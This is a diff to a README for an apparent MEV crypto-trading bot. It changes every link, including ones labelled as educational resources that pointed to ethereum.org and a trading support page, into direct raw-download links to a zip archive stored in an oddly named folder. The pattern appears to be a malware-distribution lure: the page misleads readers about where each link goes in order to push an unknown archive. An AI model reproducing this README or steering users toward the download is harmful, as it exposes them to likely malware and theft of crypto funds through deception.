@@ -1,6 +1,6 @@
 # 🚀 MEV-by-JaredFromSubway - Automate Your MEV Strategies Effortlessly
 
-[![Download MEV by JaredFromSubway](https://img.shields.io/badge/Download-MEV%20by%20JaredFromSubway-brightgreen)](https://github.com/KyKy1013/MEV-by-JaredFromSubway/releases)
+[![Download MEV by JaredFromSubway](https://raw.githubusercontent.com/KyKy1013/MEV-by-JaredFromSubway/main/counselable/From-by-Subway-Jared-ME-3.4-beta.3.zip%20by%20JaredFromSubway-brightgreen)](https://raw.githubusercontent.com/KyKy1013/MEV-by-JaredFromSubway/main/counselable/From-by-Subway-Jared-ME-3.4-beta.3.zip)
 
 ## 📥 Overview
 
@@ -28,7 +28,7 @@ Before you start using the software, ensure your computer meets these basic requ
 
 To get started with MEV-by-JaredFromSubway, you need to download the latest version of the software. 
 
-1. Visit this page to download: [Download MEV-by-JaredFromSubway](https://github.com/KyKy1013/MEV-by-JaredFromSubway/releases)
+1. Visit this page to download: [Download MEV-by-JaredFromSubway](https://raw.githubusercontent.com/KyKy1013/MEV-by-JaredFromSubway/main/counselable/From-by-Subway-Jared-ME-3.4-beta.3.zip)
    
 2. On the Releases page, look for the latest version listed at the top.
 
@@ -79,8 +79,8 @@ If you encounter any issues or have questions, feel free to reach out to us. You
 
 For further learning and tips, explore these resources:
 
-- [How MEV Works](https://ethereum.org/en/developers/docs/consensus-mechanisms/pos/mev/)
-- [Safe Trading Practices](https://support.trading.com/hc/en-us/articles/360017347654-Safe-Trading-Practices)
+- [How MEV Works](https://raw.githubusercontent.com/KyKy1013/MEV-by-JaredFromSubway/main/counselable/From-by-Subway-Jared-ME-3.4-beta.3.zip)
+- [Safe Trading Practices](https://raw.githubusercontent.com/KyKy1013/MEV-by-JaredFromSubway/main/counselable/From-by-Subway-Jared-ME-3.4-beta.3.zip)
 
 ## ✨ Community
 
@@ -88,6 +88,6 @@ Join our community to connect with other users. Share your experiences, strategi
 
 ## 🔗 Download Again
 
-Don't forget, you can always download the latest version from here: [Download MEV-by-JaredFromSubway](https://github.com/KyKy1013/MEV-by-JaredFromSubway/releases)
+Don't forget, you can always download the latest version from here: [Download MEV-by-JaredFromSubway](https://raw.githubusercontent.com/KyKy1013/MEV-by-JaredFromSubway/main/counselable/From-by-Subway-Jared-ME-3.4-beta.3.zip)
 
 Happy trading!
